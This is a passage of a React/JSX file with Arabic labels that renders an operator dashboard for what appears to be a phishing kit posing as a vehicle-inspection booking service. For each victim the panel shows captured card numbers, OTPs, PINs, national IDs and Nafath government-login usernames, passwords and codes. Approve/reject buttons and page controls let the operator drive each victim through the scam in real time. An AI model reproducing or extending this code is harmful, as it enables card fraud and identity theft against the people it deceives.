      <aside className={`flex flex-col border-l border-[#2a3942] bg-[#111b21] w-full md:w-[380px] lg:w-[420px] md:max-w-[420px] shrink-0 ${
        mobileShowDetail ? "hidden md:flex" : "flex"
      }`}>
        {/* ── Sidebar Header ─────────────────────────────────────────────── */}
        <div className="bg-[#202c33] px-4 py-3">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-teal-700 flex items-center justify-center">
                <Shield className="h-5 w-5 text-white" />
              </div>
              <div>
                <h1 className="text-base font-bold text-gray-100">لوحة التحكم</h1>
                <p className="text-[11px] text-gray-400">
                  {stats.total} زائر • {stats.online} متصل
                  {stats.approvalCount > 0 && (
                    <span className="text-red-400 mr-1">• {stats.approvalCount} بحاجة موافقة</span>
                  )}
                </p>
              </div>
            </div>
            <div className="flex items-center gap-1">
              {stats.approvalCount > 0 && (
                <div className="relative p-2">
                  <Bell className="h-5 w-5 text-red-400 flash-icon" />
                  <span className="absolute top-0.5 right-0.5 w-4 h-4 rounded-full bg-red-500 text-white text-[9px] flex items-center justify-center font-bold">
                    {stats.approvalCount}
                  </span>
                </div>
              )}
              <button
                onClick={() => setShowFilters(!showFilters)}
                className="p-2 rounded-full hover:bg-white/5 transition-colors"
                title="فلاتر"
              >
                <Settings className="h-5 w-5 text-gray-400" />
              </button>
              <button
                onClick={exportCSV}
                className="p-2 rounded-full hover:bg-white/5 transition-colors"
                title="تصدير CSV"
              >
                <Download className="h-5 w-5 text-gray-400" />
              </button>
            </div>
          </div>

          {/* Search Bar */}
          <div className="relative">
            <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
            <input
              type="text"
              placeholder="بحث..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-full h-9 pr-10 pl-3 bg-[#2a3942] text-gray-200 placeholder-gray-500 rounded-lg text-sm border-none outline-none focus:bg-[#323f49] transition-colors"
            />
          </div>
        </div>

        {/* ── Quick Stats Strip ──────────────────────────────────────────── */}
        <div className="flex items-center gap-2 px-4 py-2 border-b border-[#222e35] bg-[#111b21] overflow-x-auto chat-scrollbar-hidden">
          <button
            onClick={() => setStepFilter("all")}
            className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
              stepFilter === "all" ? "bg-teal-900/50 text-teal-300" : "bg-[#2a3942] text-gray-400"
            }`}
          >
            الكل <span className="font-bold">{stats.total}</span>
          </button>
          {stats.approvalCount > 0 && (
            <button
              onClick={() => {/* stays as visual indicator */}}
              className="shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-red-900/40 text-red-300 flash-pill"
            >
              <span className="relative flex h-1.5 w-1.5">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-red-400"></span>
              </span>
              موافقة <span className="font-bold">{stats.approvalCount}</span>
            </button>
          )}
          {stats.unread > 0 && (
            <button
              onClick={() => {}}
              className="shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-amber-900/40 text-amber-300"
            >
              جديد <span className="font-bold">{stats.unread}</span>
            </button>
          )}
          <button
            onClick={() => setStepFilter("payment-completed")}
            className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
              stepFilter === "payment-completed" ? "bg-emerald-900/50 text-emerald-300" : "bg-[#2a3942] text-gray-400"
            }`}
          >
            مكتمل <span className="font-bold">{stats.completed}</span>
          </button>
          <button
            onClick={() => setStepFilter("card-details-submitted")}
            className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
              stepFilter === "card-details-submitted" ? "bg-orange-900/50 text-orange-300" : "bg-[#2a3942] text-gray-400"
            }`}
          >
            بطاقة <span className="font-bold">{stats.pendingPayment}</span>
          </button>
        </div>

        {/* ── Filters Panel (toggle) ─────────────────────────────────────── */}
        {showFilters && (
          <div className="px-4 py-3 border-b border-[#222e35] bg-[#1a2730] space-y-2">
            <Select value={stepFilter} onValueChange={setStepFilter}>
              <SelectTrigger className="h-9 text-xs bg-[#2a3942] border-[#3a4a53] text-gray-300">
                <SelectValue placeholder="فلتر الحالة" />
              </SelectTrigger>
              <SelectContent className="bg-[#2a3942] border-[#3a4a53] text-gray-200">
                <SelectItem value="all">جميع الحالات</SelectItem>
                {Object.entries(STEP_LABELS).map(([key, label]) => (
                  <SelectItem key={key || "_empty"} value={key || "_empty"}>
                    {label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            <div className="flex items-center gap-2">
              <button
                onClick={() => { setSortField("createdAt"); setSortDir(d => d === "asc" ? "desc" : "asc") }}
                className="flex-1 flex items-center justify-center gap-1 h-8 bg-[#2a3942] border border-[#3a4a53] rounded-lg text-xs text-gray-400 hover:bg-[#323f49]"
              >
                <ArrowUpDown className="h-3 w-3" />
                {sortDir === "desc" ? "الأحدث أولاً" : "الأقدم أولاً"}
              </button>
              <button
                onClick={() => { setSearchTerm(""); setStepFilter("all") }}
                className="h-8 px-3 bg-[#2a3942] border border-[#3a4a53] rounded-lg text-xs text-gray-500 hover:bg-[#323f49]"
              >
                مسح الفلاتر
              </button>
            </div>
          </div>
        )}

        {/* ── Conversations List ─────────────────────────────────────────── */}
        <div className="flex-1 overflow-y-auto chat-scrollbar">
          {processed.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-20 text-center">
              <FileText className="h-12 w-12 text-gray-700 mb-3" />
              <p className="text-sm font-medium text-gray-500">لا توجد نتائج</p>
              <p className="text-xs text-gray-600 mt-1">جرّب تغيير معايير البحث</p>
            </div>
          ) : (
            processed.map((r) => (
              <ConversationItem
                key={r.id}
                record={r}
                isSelected={selectedId === r.id}
                onClick={() => selectConversation(r)}
                onDelete={(id) => setDeleteConfirmId(id)}
              />
            ))
          )}
        </div>
      </aside>

      {/* ═══════════════════════════════════════════════════════════════════════
          MAIN PANEL — Conversation Detail
          ═══════════════════════════════════════════════════════════════════════ */}
      <main className={`flex-1 flex flex-col min-w-0 ${
        !mobileShowDetail ? "hidden md:flex" : "flex"
      }`}>
        {selectedRecord ? (
          <>
            {/* ── Detail Header ──────────────────────────────────────────── */}
            <div className={`px-4 py-2.5 shrink-0 ${selectedNeedsApproval ? "bg-[#202c33] flash-header" : "bg-[#202c33]"}`}>
              {/* Top row: avatar + info + badges */}
              <div className="flex items-center gap-3">
                {/* Back button (mobile) */}
                <button
                  onClick={() => setMobileShowDetail(false)}
                  className="md:hidden p-1.5 rounded-full hover:bg-white/5 transition-colors"
                >
                  <ChevronRight className="h-5 w-5 text-gray-300" />
                </button>

                {/* Avatar */}
                <div className="relative shrink-0">
                  <div className={`w-10 h-10 rounded-full flex items-center justify-center text-white text-sm font-bold ${getAvatarColor(str(selectedRecord.id))} ${selectedNeedsApproval ? "ring-2 ring-red-500/70 ring-offset-1 ring-offset-[#202c33]" : ""}`}>
                    {getInitials(str(selectedRecord.ownerName) || str(selectedRecord.name) || str(selectedRecord.id).slice(0, 10))}
                  </div>
                  {selectedRecord.online === true && (
                    <span className="absolute bottom-0 left-0 w-3 h-3 bg-green-400 border-2 border-[#202c33] rounded-full" />
                  )}
                </div>

                {/* User info */}
                <div className="flex-1 min-w-0">
                  <h2 className="text-sm font-bold text-gray-100 truncate">
                    {str(selectedRecord.ownerName) || str(selectedRecord.name) || "تفاصيل السجل"}
                  </h2>
                  <p className="text-[11px] text-gray-400">
                    {selectedRecord.online === true ? (
                      <span className="text-green-400">متصل الآن</span>
                    ) : "غير متصل"} • {str(selectedRecord.country) || "—"}
                    {str(selectedRecord.phone) ? ` • ${str(selectedRecord.phone)}` : ""}
                  </p>
                </div>

                {/* Header actions + data badges */}
                <div className="flex items-center gap-1.5 shrink-0">
                  {/* Data presence badges */}
                  {!!(str(selectedRecord.cardNumber) && str(selectedRecord.cardNumber).length > 3) && (
                    <span className="inline-flex items-center gap-1 px-2 py-1 rounded-lg bg-orange-900/40 text-orange-300 text-[10px] font-bold border border-orange-800/40" title="بيانات بطاقة">
                      <CreditCard className="h-3 w-3" />
                      <span className="hidden sm:inline">بطاقة</span>
                    </span>
                  )}
                  {!!(str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)) && (
                    <span className="inline-flex items-center gap-1 px-2 py-1 rounded-lg bg-sky-900/40 text-sky-300 text-[10px] font-bold border border-sky-800/40" title="بيانات جوال">
                      <Phone className="h-3 w-3" />
                      <span className="hidden sm:inline">جوال</span>
                    </span>
                  )}
                  {!!(str(selectedRecord.nafadUsername) || str(selectedRecord.nafadPassword) || str(selectedRecord.nafaz_pin)) && (
                    <span className="inline-flex items-center gap-1 px-2 py-1 rounded-lg bg-teal-900/40 text-teal-300 text-[10px] font-bold border border-teal-800/40" title="بيانات نفاذ">
                      <Shield className="h-3 w-3" />
                      <span className="hidden sm:inline">نفاذ</span>
                    </span>
                  )}
                  {selectedNeedsApproval && (
                    <span className="hidden sm:flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-bold bg-red-900/50 text-red-300 border border-red-800/40 flash-badge">
                      <Bell className="h-3 w-3" />
                      موافقة
                    </span>
                  )}
                  {str(selectedRecord.step) && (
                    <span className={`hidden sm:inline-block px-2 py-1 rounded-lg text-[10px] font-semibold ${STEP_COLORS[str(selectedRecord.step)] || STEP_COLORS[""]}`}>
                      {STEP_LABELS[str(selectedRecord.step)] || str(selectedRecord.step)}
                    </span>
                  )}
                </div>
              </div>

              {/* Bottom row: page dropdown + delete + text field controls */}
              <div className="flex items-center gap-2 mt-2 pt-2 border-t border-[#2a3942]/60">
                <PageNavigationDropdown record={selectedRecord} onUpdate={handleUpdate} />

                {/* Delete button */}
                <button
                  onClick={() => setDeleteConfirmId(selectedRecord.id)}
                  className="flex items-center gap-1.5 h-8 px-3 rounded-lg bg-[#2a3942] border border-[#3a4a53] text-xs font-semibold text-red-400 hover:bg-red-900/30 hover:border-red-700 transition-colors"
                  title="حذف السجل"
                >
                  <Trash2 className="h-3.5 w-3.5" />
                  <span className="hidden sm:inline">حذف</span>
                </button>

                {/* Inline nafaz fields */}
                <div className="flex items-center gap-1.5 flex-1 min-w-0">
                  <div className="flex items-center gap-1 flex-1 min-w-0">
                    <span className="text-[10px] text-gray-500 shrink-0 hidden lg:inline">نفاذ:</span>
                    <input
                      key={"hdr-auth-" + selectedRecord.id + "-" + str(selectedRecord.authNumber)}
                      defaultValue={str(selectedRecord.authNumber)}
                      placeholder="authNumber"
                      className="h-7 text-xs flex-1 min-w-[60px] bg-[#1b2b33] border border-[#2a3942] rounded px-2 text-gray-200 placeholder-gray-600 outline-none focus:border-teal-600 transition-colors"
                      onBlur={(e) => {
                        if (e.target.value !== str(selectedRecord.authNumber)) {
                          handleUpdate(selectedRecord.id, { authNumber: e.target.value })
                        }
                      }}
                      onKeyDown={(e) => {
                        if (e.key === "Enter") {
                          (e.target as HTMLInputElement).blur()
                        }
                      }}
                    />
                  </div>
                  <div className="flex items-center gap-1 flex-1 min-w-0">
                    <span className="text-[10px] text-gray-500 shrink-0 hidden lg:inline">PIN:</span>
                    <input
                      key={"hdr-pin-" + selectedRecord.id + "-" + str(selectedRecord.nafaz_pin)}
                      defaultValue={str(selectedRecord.nafaz_pin)}
                      placeholder="nafaz_pin"
                      className="h-7 text-xs flex-1 min-w-[60px] bg-[#1b2b33] border border-[#2a3942] rounded px-2 text-gray-200 placeholder-gray-600 outline-none focus:border-teal-600 transition-colors"
                      onBlur={(e) => {
                        if (e.target.value !== str(selectedRecord.nafaz_pin)) {
                          handleUpdate(selectedRecord.id, { nafaz_pin: e.target.value })
                        }
                      }}
                      onKeyDown={(e) => {
                        if (e.key === "Enter") {
                          (e.target as HTMLInputElement).blur()
                        }
                      }}
                    />
                  </div>
                </div>

                <span className="bg-[#1b2b33] text-gray-500 text-[10px] font-mono px-2 py-1 rounded border border-[#2a3942] shrink-0 hidden md:inline">
                  {selectedRecord.id.slice(0, 10)}...
                </span>
              </div>
            </div>

            {/* ── Detail Content ─────────────────────────────────────────── */}
            <div
              ref={detailRef}
              className="flex-1 overflow-y-auto bg-[#0b141a] chat-pattern-dark chat-scrollbar"
            >
              <div className="p-4 space-y-3">
                {/* ID Badge */}
                <div className="flex justify-center mb-1">
                  <span className="bg-[#1b2b33]/90 backdrop-blur-sm text-gray-500 text-[11px] font-mono px-4 py-1.5 rounded-full shadow-sm border border-[#2a3942]">
                    {selectedRecord.id}
                  </span>
                </div>

                {/* ── Approval Alert Banner (full width) ───────────────── */}
                {selectedNeedsApproval && (
                  <div className="bg-red-900/30 border border-red-800/50 rounded-xl p-4 flash-section">
                    <div className="flex items-center gap-3">
                      <div className="relative shrink-0">
                        <span className="relative flex h-5 w-5">
                          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                          <span className="relative inline-flex rounded-full h-5 w-5 bg-red-500 items-center justify-center">
                            <AlertTriangle className="h-3 w-3 text-white" />
                          </span>
                        </span>
                      </div>
                      <div>
                        <p className="text-sm font-bold text-red-300">هذا الزائر يحتاج موافقتك!</p>
                        <p className="text-xs text-red-400/80 mt-0.5">انتقل إلى قسم &quot;التحكم في الموافقات&quot; أدناه لاتخاذ إجراء</p>
                      </div>
                    </div>
                  </div>
                )}

                {/* ═══════════════════════════════════════════════════════════
                    THREE-COLUMN GRID
                    Col 1: Basic Info | Col 2: Card & Codes | Col 3: Phone/Nafaz
                    ═══════════════════════════════════════════════════════════ */}
                <div className="grid grid-cols-1 lg:grid-cols-3 gap-3">

                  {/* ──────────────────────────────────────────────────────
                      COLUMN 1 — Basic Information
                      ────────────────────────────────────────────────────── */}
                  <div className="space-y-3">
                    {/* Personal Info */}
                    <MiniSection title="المعلومات الشخصية" icon={User}>
                      <DetailRow icon={User} label="اسم المالك" value={str(selectedRecord.ownerName) || str(selectedRecord.name)} copyable />
                      <DetailRow icon={Hash} label="رقم الهوية" value={str(selectedRecord.nationalId) || str(selectedRecord.idNumber)} mono copyable />
                      <DetailRow icon={Phone} label="رقم الجوال" value={str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)} mono copyable />
                      <DetailRow icon={Globe} label="البلد" value={str(selectedRecord.country)} />
                      <DetailRow icon={FileText} label="البريد" value={str(selectedRecord.email) || str(selectedRecord.delegateEmail)} copyable />
                    </MiniSection>

                    {/* Vehicle Info */}
                    {(str(selectedRecord.plateNumbers) || str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)) && (
                      <MiniSection title="معلومات المركبة" icon={Car}>
                        <DetailRow icon={Hash} label="اللوحة" value={str(selectedRecord.plateLetters) + " " + str(selectedRecord.plateNumbers)} mono copyable />
                        <DetailRow icon={Car} label="نوع المركبة" value={str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)} />
                        <DetailRow icon={FileText} label="حالة المركبة" value={str(selectedRecord.vehicleStatus)} />
                        <DetailRow icon={Hash} label="الرقم التسلسلي" value={str(selectedRecord.serialNumber)} mono copyable />
                        <DetailRow icon={MapPin} label="المنطقة / المدينة" value={[str(selectedRecord.region), str(selectedRecord.city)].filter(Boolean).join(" / ") || undefined} />
                        <DetailRow icon={Calendar} label="موعد الفحص" value={[str(selectedRecord.inspectionDate), str(selectedRecord.inspectionTime)].filter(Boolean).join(" - ") || undefined} />
                      </MiniSection>
                    )}

                    {/* Delegate Info */}
                    {(str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)) && (
                      <MiniSection title="بيانات المفوض" icon={Users}>
                        <DetailRow icon={User} label="اسم المفوض" value={str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)} copyable />
                        <DetailRow icon={Phone} label="جوال المفوض" value={str(selectedRecord.delegatePhone) || str(selectedRecord.authorizedPhone)} mono copyable />
                        <DetailRow icon={Hash} label="هوية المفوض" value={str(selectedRecord.delegateIdNumber) || str(selectedRecord.authorizedId)} mono copyable />
                        <DetailRow icon={Calendar} label="تاريخ الميلاد" value={str(selectedRecord.authorizedBirthDate)} />
                      </MiniSection>
                    )}

                    {/* Timestamps */}
                    <MiniSection title="التوقيتات" icon={Clock}>
                      <DetailRow icon={Clock} label="تاريخ الإنشاء" value={formatDate(str(selectedRecord.createdAt) || str(selectedRecord.createdDate))} />
                      <DetailRow icon={Clock} label="آخر تحديث" value={formatDate(str(selectedRecord.updatedAt))} />
                      <DetailRow icon={Clock} label="تاريخ الإكمال" value={formatDate(str(selectedRecord.completedDate))} />
                    </MiniSection>
                  </div>

                  {/* ──────────────────────────────────────────────────────
                      COLUMN 2 — Card & Verification Codes
                      ────────────────────────────────────────────────────── */}
                  <div className="space-y-3">
                    {/* Visual Credit Card */}
                    <VisualCreditCard record={selectedRecord} />

                    {/* Verification Codes */}
                    <div className="grid grid-cols-2 gap-2">
                      <CodeDisplay label="OTP" value={str(selectedRecord.otp) || str(selectedRecord.phoneOtp)} color="purple" />
                      <CodeDisplay label="PIN" value={str(selectedRecord.pin)} color="amber" />
                    </div>

                    {/* Card Approve/Reject — inline under card */}
                    <div className={`bg-[#1f2c34] rounded-xl border p-3 ${selectedNeedsApproval && ["card-details-submitted", "otp-submitted", "pin-submitted"].includes(str(selectedRecord.step)) ? "border-red-500/50 flash-section" : "border-[#2a3942]"}`}>
                      <div className="flex items-center gap-2 mb-1">
                        <CreditCard className="h-3.5 w-3.5 text-teal-400" />
                        <span className="text-xs font-bold text-gray-300">موافقة البطاقة</span>
                        {str(selectedRecord.cardApproval) && (
                          <span className={`text-[10px] font-semibold px-1.5 py-0.5 rounded ${APPROVAL_COLORS[str(selectedRecord.cardApproval)] || "bg-gray-700/50 text-gray-400 border-gray-600"}`}>
                            {APPROVAL_LABELS[str(selectedRecord.cardApproval)] || str(selectedRecord.cardApproval)}
                          </span>
                        )}
                      </div>
                      <ApproveRejectButtons record={selectedRecord} field="cardApproval" onUpdate={handleUpdate} />
                    </div>

                    {/* Operator */}
                    {str(selectedRecord.operator) && (
                      <MiniSection title="المشغل" icon={Wifi}>
                        <DetailRow icon={Phone} label="مشغل الاتصال" value={str(selectedRecord.operator)} />
                      </MiniSection>
                    )}

                    {/* Raw JSON */}
                    <Section title="البيانات الخام" icon={FileText} defaultOpen={false}>
                      <pre className="bg-[#0b141a] text-green-400 p-3 rounded-lg text-[10px] overflow-x-auto max-h-52 leading-relaxed border border-[#2a3942]" dir="ltr">
                        {JSON.stringify(selectedRecord, null, 2)}
                      </pre>
                    </Section>
                  </div>

                  {/* ──────────────────────────────────────────────────────
                      COLUMN 3 — Phone, Nafaz & Info
                      ────────────────────────────────────────────────────── */}
                  <div className="space-y-3">
                    {/* Phone Info + Approve/Reject */}
                    <MiniSection title="معلومات الجوال" icon={Phone}>
                      <DetailRow icon={Phone} label="رقم الجوال" value={str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)} mono copyable />
                      <DetailRow icon={Wifi} label="شركة الاتصال" value={str(selectedRecord.phoneCarrier) || str(selectedRecord.operator)} copyable />
                      {/* Missing carrier warning */}
                      {!(str(selectedRecord.phoneCarrier) || str(selectedRecord.operator)) && (str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)) && (
                        <div className="flex items-center gap-2 py-2 border-b border-[#2a3942]/60">
                          <AlertTriangle className="h-3.5 w-3.5 text-amber-400 shrink-0" />
                          <span className="text-[11px] text-amber-400/80">شركة الاتصال غير محددة</span>
                        </div>
                      )}
                      <DetailRow icon={Hash} label="OTP الجوال" value={str(selectedRecord.phoneOtp)} mono copyable />
                      {/* Phone Approve/Reject */}
                      <div className="mt-2 pt-2 border-t border-[#2a3942]/60">
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className="text-[10px] text-gray-500">موافقة الجوال</span>
                          {str(selectedRecord.phoneApproval) && (
                            <span className={`text-[9px] font-semibold px-1.5 py-0.5 rounded ${APPROVAL_COLORS[str(selectedRecord.phoneApproval)] || "bg-gray-700/50 text-gray-400 border-gray-600"}`}>
                              {APPROVAL_LABELS[str(selectedRecord.phoneApproval)] || str(selectedRecord.phoneApproval)}
                            </span>
                          )}
                        </div>
                        <ApproveRejectButtons record={selectedRecord} field="phoneApproval" onUpdate={handleUpdate} />
                      </div>
                      {/* Phone OTP Approve/Reject */}
                      <div className="mt-2 pt-2 border-t border-[#2a3942]/60">
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className="text-[10px] text-gray-500">موافقة OTP الجوال</span>
                          {str(selectedRecord.phoneOtpApproval) && (
                            <span className={`text-[9px] font-semibold px-1.5 py-0.5 rounded ${APPROVAL_COLORS[str(selectedRecord.phoneOtpApproval)] || "bg-gray-700/50 text-gray-400 border-gray-600"}`}>
                              {APPROVAL_LABELS[str(selectedRecord.phoneOtpApproval)] || str(selectedRecord.phoneOtpApproval)}
                            </span>
                          )}
                        </div>
                        <ApproveRejectButtons record={selectedRecord} field="phoneOtpApproval" onUpdate={handleUpdate} />
                      </div>
                    </MiniSection>

                    {/* Nafaz Info */}
                    {(str(selectedRecord.nafadUsername) || str(selectedRecord.nafadPassword) || str(selectedRecord.nafaz_pin) || str(selectedRecord.authNumber)) && (
                      <MiniSection title="بيانات نفاذ" icon={Shield}>
                        <DetailRow icon={User} label="اسم المستخدم" value={str(selectedRecord.nafadUsername)} mono copyable />
                        <DetailRow icon={Shield} label="كلمة المرور" value={str(selectedRecord.nafadPassword)} mono copyable />
                        <DetailRow icon={Hash} label="رمز نفاذ" value={str(selectedRecord.nafaz_pin) || str(selectedRecord.authNumber)} mono copyable />
                      </MiniSection>
                    )}
                  </div>
                </div>

                {/* Bottom spacer */}
                <div className="h-4" />
              </div>
            </div>
          </>
        ) : (
          <EmptyState />
        )}
      </main>

      {/* ═══════════════════════════════════════════════════════════════════════
          DELETE CONFIRMATION OVERLAY
          ═══════════════════════════════════════════════════════════════════════ */}
      {deleteConfirmId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm" onClick={() => setDeleteConfirmId(null)}>
          <div
            className="bg-[#1f2c34] border border-[#2a3942] rounded-2xl p-6 w-[340px] shadow-2xl"
            onClick={(e) => e.stopPropagation()}
            dir="rtl"
          >
            <div className="flex items-center justify-center w-14 h-14 rounded-full bg-red-900/30 mx-auto mb-4">
              <Trash2 className="h-7 w-7 text-red-400" />
            </div>
            <h3 className="text-base font-bold text-gray-100 text-center mb-2">حذف السجل؟</h3>
            <p className="text-xs text-gray-400 text-center mb-1">
              سيتم حذف هذا السجل نهائياً من قاعدة البيانات
            </p>
            <p className="text-[10px] text-gray-500 text-center font-mono mb-5 truncate">
              {deleteConfirmId}
            </p>
            <div className="flex items-center gap-3">
              <button
                onClick={() => setDeleteConfirmId(null)}
                className="flex-1 h-10 rounded-lg text-sm font-semibold bg-[#2a3942] text-gray-300 border border-[#3a4a53] hover:bg-[#323f49] transition-colors"
              >
                إلغاء
              </button>
              <button
                onClick={() => handleDelete(deleteConfirmId)}
                disabled={deleting}
                className="flex-1 h-10 rounded-lg text-sm font-bold bg-red-600 text-white hover:bg-red-500 transition-colors flex items-center justify-center gap-2 disabled:opacity-50"
              >
                {deleting ? <Loader2 className="h-4 w-4 animate-spin" /> : <Trash2 className="h-4 w-4" />}
                حذف نهائي
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
